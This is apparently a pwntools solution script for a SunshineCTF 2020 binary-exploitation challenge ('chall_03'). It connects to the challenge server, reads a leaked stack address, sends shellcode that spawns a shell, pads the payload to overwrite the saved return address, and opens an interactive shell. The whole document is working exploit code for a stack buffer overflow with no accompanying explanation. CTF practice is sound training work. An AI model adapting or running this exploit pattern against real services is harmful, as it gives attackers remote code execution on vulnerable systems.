from pwn import *
binary = context.binary = ELF('./chall_03')
p = remote('chal.2020.sunshinectf.org',30003)
p.sendlineafter('Just in time.\n','IxZ')

p.recvuntil('I\'ll make it: ')
addrshell = p.recvline().strip()
addr = int(addrshell,16)
payload = b''
payload += asm(shellcraft.sh())
print('len payload: ',len(payload))
payload += (0x78 - len(payload)) * b'a'
payload += p64(addr)
print('payload: ',payload)
p.sendline(payload)
p.interactive()

